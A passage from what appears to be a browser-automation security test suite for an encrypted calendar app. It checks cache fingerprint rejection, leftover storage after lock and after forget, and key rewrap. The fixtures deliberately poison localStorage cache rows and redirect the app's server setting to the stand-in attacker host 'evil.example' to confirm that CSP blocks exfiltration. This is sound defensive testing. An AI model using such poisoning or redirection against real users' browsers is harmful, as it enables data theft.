      const o = JSON.parse(localStorage.getItem('clock_poc_cache_v45'));
      o.fp = 'deadbeef|foreign';
      localStorage.setItem('clock_poc_cache_v45', JSON.stringify(o));
    });
    await p3.fill('#password', PW);
    await p3.click('#login-form button[type=submit]');
    await p3.waitForSelector('#app:not([hidden])', { timeout: 20000 });
    await sleep(1200);
    const chips = await p3.evaluate(() => document.querySelectorAll('.fc-event').length);
    res('S8a foreign-fp cache NEVER hydrates (control paints offline)', ctrlChips > 0 && chips === 0, `control chips=${ctrlChips}, foreign-fp chips=${chips}`);
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER } });
    await unlockIn(page);
    await page.waitForSelector('.fc-event', { timeout: 15000 }).catch(() => { });
    await sleep(800);
    await page.close();
    const p2 = await ctx.newPage();
    await p2.goto(APP, { waitUntil: 'domcontentloaded' });
    await p2.evaluate(() => {
      const o = JSON.parse(localStorage.getItem('clock_poc_cache_v45'));
      for (const r of o.evt) {
        r.ver = 999999;
        r.text = r.text.replace(/SUMMARY:[^\r]*/, 'SUMMARY:VP3R-GHOST-POISONED');
      }
      localStorage.setItem('clock_poc_cache_v45', JSON.stringify(o));
    });
    await unlockIn(p2);
    await p2.waitForSelector('.fc-event', { timeout: 15000 });
    await sleep(1500);
    const chips = await p2.evaluate(() => [...document.querySelectorAll('.fc-event')].map((c) => c.textContent).join('|'));
    res('S8b right-fp poisoned rows PIN against server truth', chips.includes('VP3R-GHOST-POISONED'), JSON.stringify(chips.slice(0, 60)));
    await ctx.close();
  }
} catch (e) { res('S8 section crash', false, String(e).slice(0, 200)); }

/* ============ S9 — post-lock / post-forget residuals (JOB 2) ============ */
try {
  const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER } });
  await unlockIn(page);
  await page.waitForSelector('.fc-event', { timeout: 15000 }).catch(() => { });
  await page.click('#btn-lock');
  await sleep(400);
  const afterLock = await page.evaluate(() => {
    const o = {};
    for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); o[k] = localStorage.getItem(k); }
    return o;
  });
  const leakLock = Object.entries(afterLock).filter(([k, v]) => k !== 'clock_poc_cache_v45' && /VP3MARKER|VP3R-GHOST/i.test(v));
  res('S9a post-lock residuals exactly as documented',
    afterLock['clock_poc_cache_v45'] === undefined &&
    afterLock['clock_poc_auth_ui'] !== undefined &&
    afterLock['clock_poc_cfg_v45'] !== undefined &&
    afterLock['clock_poc_server'] !== undefined &&
    leakLock.length === 0,
    `keys=${Object.keys(afterLock).join(',')} plaintext-leaks=${JSON.stringify(leakLock.map((x) => x[0]))}`);
  await unlockIn(page);
  await page.waitForSelector('.fc-event', { timeout: 15000 }).catch(() => { });
  await page.click('#btn-forget');
  await sleep(500);
  const afterForget = await page.evaluate(() => {
    const o = {};
    for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); o[k] = localStorage.getItem(k); }
    return o;
  });
  const gone = ['clock_poc_auth_ui', 'clock_poc_cfg_v45', 'clock_poc_server', 'clock_poc_cache_v45'].every((k) => afterForget[k] === undefined);
  const leakForget = Object.entries(afterForget).filter(([k, v]) => /VP3MARKER|VP3R-GHOST/i.test(v));
  res('S9b post-forget residuals minimal (settings/view only)', gone && leakForget.length === 0, `keys=${Object.keys(afterForget).join(',') || '(none)'} leaks=${JSON.stringify(leakForget.map((x) => x[0]))}`);
  await ctx.close();
} catch (e) { res('S9 section crash', false, String(e).slice(0, 200)); }

/* ============ S10 — poisoned server + CSP offline path (JOB 1+2) ============ */
try {
  const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER } });
  await unlockIn(page);
  await page.waitForSelector('.fc-event', { timeout: 15000 }).catch(() => { });
  await page.evaluate(() => localStorage.setItem('clock_poc_server', 'https://evil.example/'));
  await page.goto(APP, { waitUntil: 'domcontentloaded' });
  await sleep(500);
  const note = await page.evaluate(() => ({ hidden: document.getElementById('server-note').hidden, text: document.getElementById('server-note').textContent }));
  const cerrs = [];
  page.on('console', (m) => { if (m.type() === 'error') cerrs.push(m.text()); });
  await page.fill('#password', PW);
  await page.click('#login-form button[type=submit]');
  await page.waitForSelector('#app:not([hidden])', { timeout: 25000 });
  await sleep(1500);
  const t = await toasts(page);
  const chips = await page.evaluate(() => document.querySelectorAll('.fc-event').length);
  res('S10a poisoned remote server: CSP connect-src blocks the dial', cerrs.some((c) => c.includes('Content Security Policy') && c.includes('evil.example')), (cerrs.find((c) => c.includes('evil.example')) || 'no violation logged').slice(0, 100));
  res('S10b offline fallback paints LOCAL cache only (no exfil)', chips > 0 && t.some((x) => x.includes('Server unreachable')), `chips=${chips}`);
  res('S10c warning banner present pre-unlock', note.hidden === false && note.text.includes('evil.example'), note.text.slice(0, 60));
  await ctx.close();
} catch (e) { res('S10 section crash', false, String(e).slice(0, 200)); }

/* ============ S11 — 7-theme sweep, full render, zero console errors (JOB 2) ============ */
try {
  const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER } });
  const cerrs = [];
  page.on('console', (m) => { if (m.type() === 'error') cerrs.push(m.text()); });
  page.on('pageerror', (e) => cerrs.push('pageerror:' + e.message));
  await unlockIn(page);
  await page.waitForSelector('.fc-event', { timeout: 15000 }).catch(() => { });
  const order = ['forma', 'breezy', 'pulse', 'classic', 'shadcn', 'mui', 'monarch'];
  const labels = { forma: 'Forma', breezy: 'Breezy', pulse: 'Pulse', classic: 'Classic', shadcn: 'Shadcn', mui: 'MUI', monarch: 'Monarch' };
  await page.click('#btn-settings');
  await page.waitForSelector('#settings-modal .eventform');
  let allOk = true; const seen = [];
  for (const id of order) {
    await page.click(`#settings-modal [aria-label="Calendar theme"] button:has-text("${labels[id]}")`);
    await sleep(900);
    const st = await page.evaluate(() => ({ theme: document.documentElement.dataset.fctheme, fc: !!document.querySelector('#calendar [data-date]'), chips: document.querySelectorAll('.fc-event').length }));
    seen.push(`${id}:${st.theme}/${st.fc ? 'fc' : 'NO-FC'}/${st.chips}`);
    if (st.theme !== id || !st.fc) allOk = false;
  }
  await page.click('#settings-modal .modal-footer .button-primary');
  res('S11 all 7 themes render live, zero console errors', allOk && cerrs.length === 0, seen.join(' ') + ` errs=${JSON.stringify(cerrs.slice(0, 3))}`);
  await ctx.close();
} catch (e) { res('S11 section crash', false, String(e).slice(0, 200)); }

/* ============ S12 — genuine Type-A rewrap: changed online cfg purges stale model (JOB 1) ============ */
try {
  const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER } });
  await unlockIn(page);
  await page.waitForSelector('.fc-event', { timeout: 15000 }).catch(() => { });
  await sleep(800);
  const cacheBefore = (await ls(page, 'clock_poc_cache_v45')) !== null;
  await page.close();
  const NEWPW = 'rotated-vp3r';
  const newSalt = crypto.getRandomValues(new Uint8Array(16));
  const saltHex = [...newSalt].map((b) => b.toString(16).padStart(2, '0')).join('');
  const kekBits = await crypto.subtle.deriveBits(
    { name: 'PBKDF2', hash: 'SHA-256', salt: newSalt, iterations: 100000 },
    await crypto.subtle.importKey('raw', TE.encode(NEWPW), 'PBKDF2', false, ['deriveBits']), 256);
  const kek = await crypto.subtle.importKey('raw', kekBits, 'AES-GCM', false, ['encrypt']);
  const nonce = crypto.getRandomValues(new Uint8Array(12));
  const wrapped = new Uint8Array(await crypto.subtle.encrypt({ name: 'AES-GCM', iv: nonce }, kek, hexB(MAT.aes1_hex)));
  const rr = await fetch(`${WORKER}/bootstrap/rewrap`, {
    method: 'PUT',
    headers: { authorization: `Bearer ${ADMIN}`, 'content-type': 'application/json' },
    body: JSON.stringify({ wrapped: b64(wrapped), salt: saltHex, iters: 100000 }),
  });
  const p2 = await ctx.newPage();
  await p2.goto(APP, { waitUntil: 'domcontentloaded' });
  await sleep(400);
  await p2.fill('#password', PW);
  await p2.click('#login-form button[type=submit]');
  await sleep(2500);
  const t = await toasts(p2);
  const cacheAfter = await ls(p2, 'clock_poc_cache_v45');
  const loginErr = await p2.evaluate(() => document.getElementById('login-msg').textContent);
  await p2.fill('#password', NEWPW);
  await p2.click('#login-form button[type=submit]');
  await p2.waitForSelector('#app:not([hidden]) #calendar [data-date]', { timeout: 25000 });
  res('S12 online cfg change purges stale model + blocks old pw',
    rr.ok && cacheBefore && cacheAfter === null && t.some((x) => x.includes('key material changed')) && loginErr.includes('wrong password'),
    `rewrap=${rr.status} cache ${cacheBefore ? 'present' : '?'}→${cacheAfter === null ? 'purged' : 'STILL THERE'} toast=${t.some((x) => x.includes('key material changed'))} err=${loginErr.slice(0, 45)}`);
  await ctx.close();
} catch (e) { res('S12 section crash', false, String(e).slice(0, 200)); }

/* ---------- cleanup: self-delete the crafted rows ---------- */
try {
  await delRow(`cmeta:${calUuid}`);
  await delRow(`evt:${calUuid}:${uid}`);
  await delRow(`cmeta:${calUuid2}`);
  const m = await fetch(`${WORKER}/rows`, { headers: { authorization: `Bearer ${MAT.auth_ui_hex}` } });
  const manifest = await m.json();
  const leftover = (manifest.rows || []).filter((r) => String(r.id).includes('vp3r'));
  res('CLEANUP crafted rows self-deleted', leftover.length === 0, `manifest rows=${(manifest.rows || []).length} vp3r-left=${leftover.length}`);
} catch (e) { res('CLEANUP crash', false, String(e).slice(0, 160)); }

const bad = results.filter((r) => !r.ok);
console.log(`\n===== VP3R local: ${results.length - bad.length}/${results.length} checks passed =====`);
if (bad.length) console.log('FAILED: ' + bad.map((b) => b.id).join(' | '));
await browser.close();
evil.close();
process.exit(0);
